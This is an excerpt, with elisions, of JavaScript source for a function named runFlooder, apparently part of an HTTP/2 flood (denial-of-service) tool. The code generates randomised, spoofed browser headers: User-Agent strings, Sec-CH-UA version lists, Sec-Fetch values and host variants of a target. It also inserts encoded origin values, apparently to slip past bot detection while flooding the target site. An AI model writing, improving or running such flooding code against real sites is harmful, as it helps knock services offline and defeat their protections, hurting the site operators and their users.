...
function runFlooder() {
  ...
  // Randomly select a host (with subdomains or without)
  const getRandomHost = () =>
    `${Math.random() < 0.5 ? "" : "www."}${parsedTarget.host}${Math.random() < 0.5 ? "." : ""}`;

  // Get random version for a specific browser
  const getVersion = (browser) => {
    const versions = {
      chrome: { min: 112, max: 124 },
      duckduckgo: { min: 12, max: 16 },
      safari: { min: 12, max: 16 },
      brave: { min: 112, max: 124 },
      firefox: { min: 99, max: 132 },
      mobile: { min: 85, max: 105 },
      opera: { min: 70, max: 90 },
      operagx: { min: 70, max: 90 },
      edge: { min: 112, max: 124 },
      yandex: { min: 21, max: 23 },
    };
    return (
      Math.floor(
        Math.random() * (versions[browser].max - versions[browser].min + 1),
      ) + versions[browser].min
    );
  };

  // Get full version of a specific browser (for headers)
  const getFullVersion = (browser) => {
    const fullVersions = {
      brave: "1.71.118",
      duckduckgo: "91.0",
    ...
    return fullVersions[browser];
  };

  // Generate the Sec-CH-UA Full Version List
  const getSecChUAFullVersionList = () => {
    const fullVersions = {
      brave: "1.71.118",
      duckduckgo: "91.0",
      chrome: "126.0.6478.258",
      firefox: "131.0.3",
      safari: "17.4",
      mobile: "125.0.6775.55",
      opera: "114.0.5282.102",
  ...
  // Create User-Agent string for each browser
  const getUserAgent = (browser, version) => {
    const userAgentTemplates = {
      ...
      edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/${version}.0.0.0 Safari/537.36`,
      yandex: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Yandex/${version}.0.0.0 Safari/537.36`,
    };
    return userAgentTemplates[browser];
  };

  // Generate headers with all the dynamic values
  const generateHeaders = (browser) => {
    ...
    const secFetchDest =
      [
        ...
        "sharedworker",
        "video",
      ][Math.floor(Math.random() * 12)] || "document";
    const secFetchMode =
    ...
    const headers = {
      ":method": "GET",
      ":authority": `${Math.random() < 0.5 ? "" : "www."}${parsedTarget.host}${Math.random() < 0.5 ? "." : ""}`,
      ":scheme": "https",
  ...
  const rhd = [
    ...
    {
      Nel: '{ "report_to": "name_of_reporting_group", "max_age": 0, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }',
    },
  ];
  const hd1 = [
      ...
      ? {
          origin:
            Math.random() < 0.5
              ...
              : "https://" +
                (Math.random() < 0.5 ? "root-%61%64%6D%69%6E." : "root-root." ) +
                clength,
        }
      : {}),
  };
